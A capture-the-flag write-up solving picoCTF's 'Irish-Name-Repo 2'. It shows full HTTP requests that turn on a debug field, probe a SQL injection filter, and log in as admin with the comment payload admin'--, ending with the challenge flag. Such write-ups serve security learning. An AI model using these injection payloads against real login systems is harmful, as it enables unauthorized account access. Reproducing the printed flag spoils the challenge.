# picoGym Level 59: Irish-Name-Repo 2
Source: https://play.picoctf.org/practice/challenge/59

## Goal
There is a website running at https://jupiter.challenges.picoctf.org/problem/53751/<br>
http://jupiter.challenges.picoctf.org:53751<br>
Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login!

## What I learned
```
SQL Injection Filtered
```             

## Solution
```
https://webshell.picoctf.org/

# View Page Source
<!doctype html>
<html>
<head>
    <title>Login</title>
    <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
</head>
<body>
<div class="container">
    <div class="row">
        <div class="col-md-12">
            <div class="panel panel-primary" style="margin-top:50px">
                <div class="panel-heading">
                    <h3 class="panel-title">Log In</h3>
                </div>
                <div class="panel-body">
                    <form action="login.php" method="POST">
                        <fieldset>
                            <div class="form-group">
                                <label for="username">Username:</label>
                                <input type="text" id="username" name="username" class="form-control">
                            </div>
                            <div class="form-group">
                                <label for="password">Password:</label>
                                <div class="controls">
                                    <input type="password" id="password" name="password" class="form-control">
                                </div>
                            </div>
                            <input type="hidden" name="debug" value="0"> 👀 has debug value
                            <div class="form-actions">
                                <input type="submit" value="Login" class="btn btn-primary">
                            </div>
                        </fieldset>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>

# Tried SQL Injection ' OR '1'='1
SQLi detected.

# Burp Suite
# Request
POST /login.php HTTP/1.1
Host: jupiter.challenges.picoctf.org:53751
Content-Length: 46
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://jupiter.challenges.picoctf.org:53751
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://jupiter.challenges.picoctf.org:53751/login.html
Accept-Encoding: gzip, deflate, br
Cookie: _ga=GA1.2.647513796.1755785140; _ga_L6FT52K063=GS2.2.s1755785141$o1$g1$t1755785333$j60$l0$h844368113
Connection: keep-alive

username=admin&password=username%3D%27&debug=1 👀 debug on and check filter

# Reponse, Know ' not blocked since not filter
HTTP/1.1 500 Internal Server Error 👀
Content-type: text/html; charset=UTF-8

<pre>username: admin
password: username='
SQL query: SELECT * FROM users WHERE name='admin' AND password='username='' 👀 From debug = 1
</pre>

# Request w/ OR
POST /login.php HTTP/1.1
Host: jupiter.challenges.picoctf.org:53751
Content-Length: 48
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://jupiter.challenges.picoctf.org:53751
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://jupiter.challenges.picoctf.org:53751/login.html
Accept-Encoding: gzip, deflate, br
Cookie: _ga=GA1.2.647513796.1755785140; _ga_L6FT52K063=GS2.2.s1755785141$o1$g1$t1755785333$j60$l0$h844368113
Connection: keep-alive

username=admin&password=username%3D%27OR&debug=1 👀

# Response, OR is blocked
HTTP/1.1 200 OK
Content-type: text/html; charset=UTF-8

<pre>username: admin
password: username='OR
SQL query: SELECT * FROM users WHERE name='admin' AND password='username='OR'
</pre><h1>SQLi detected.</h1> 👀

# Request w/ username: admin'-- then password would be commented out
POST /login.php HTTP/1.1
Host: jupiter.challenges.picoctf.org:53751
Content-Length: 35
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://jupiter.challenges.picoctf.org:53751
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://jupiter.challenges.picoctf.org:53751/login.html
Accept-Encoding: gzip, deflate, br
Cookie: _ga=GA1.2.647513796.1755785140; _ga_L6FT52K063=GS2.2.s1755785141$o1$g1$t1755785333$j60$l0$h844368113
Connection: keep-alive

username=admin'--&password=&debug=1 👀

# Response
HTTP/1.1 200 OK
Content-type: text/html; charset=UTF-8

<pre>username: admin'--
password: 
SQL query: SELECT * FROM users WHERE name='admin'--' AND password=''
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_c34df170}</p> 🔐
```

## Flag
picoCTF{m0R3_SQL_plz_c34df170}

## Continue
[Continue](./picoGym0059.md)